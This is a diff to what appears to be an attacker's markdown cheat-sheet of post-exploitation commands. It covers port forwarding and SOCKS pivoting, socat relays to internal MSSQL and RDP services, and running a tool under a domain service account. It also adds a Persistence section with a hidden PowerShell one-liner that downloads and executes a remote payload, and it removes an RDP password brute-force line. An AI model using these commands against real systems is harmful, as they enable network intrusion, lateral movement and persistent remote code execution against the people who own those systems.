@@ -16,7 +16,7 @@ msf5 exploit(multi/script/web_delivery) > exploit -j
 ```
 socks 1080
 
-rportfwd 8080 192.168.100.166 443
+rportfwd 8080 10.8.0.166 80
 
 proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
 runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
@@ -27,11 +27,15 @@ PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::u
 
 ### RDP
 ```
-socks 1337
+socks 1080
 proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
- xfreerdp /v:127.0.0.1 -sec-nla /u:""
- /crowbar.py -b rdp -u Administrator -C /usr/share/john/password.lst -s 127.0.0.1/32 -v
+xfreerdp /v:127.0.0.1 -sec-nla /u:""
 rportfwd 8080 178.62.56.134 80
 powershell.exe -nop -w hidden -c iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))
 ```
+### Persistence
+```
+rportfwd 8080 Teamserver 80
+powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))"
 
+```
